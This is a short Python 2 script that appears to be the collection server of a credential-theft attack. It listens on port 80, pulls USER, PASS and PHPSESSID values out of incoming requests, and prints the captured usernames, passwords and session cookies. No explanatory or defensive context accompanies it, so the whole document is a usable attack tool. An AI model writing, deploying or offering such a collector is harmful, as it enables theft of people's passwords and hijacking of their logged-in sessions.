import socket,sys,re
from thread import *
HOST = ''
PORT = 80
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
    s.bind((HOST, PORT))
except:
    sys.exit()
s.listen(10)
def clientthread(conn):
    while True:
        data = conn.recv(1024)
        user = re.findall(r'USER=\w*',data)
        user = re.sub('^USER=','',user[0])
        pswd = re.findall(r'PASS=\w*',data)
        pswd = re.sub('^PASS=','',pswd[0])
        sess = re.findall(r'PHPSESSID=\w*',data)
        sess = re.sub('^PHPSESSID=','',sess[0])
        print 'user:'+user+'|pass:'+pswd+'|session-cookie:'+sess
        if not data: 
            break
    conn.close()
try: 
    while 1:
        conn, addr = s.accept()
        start_new_thread(clientthread ,(conn,))
except:
    s.close()
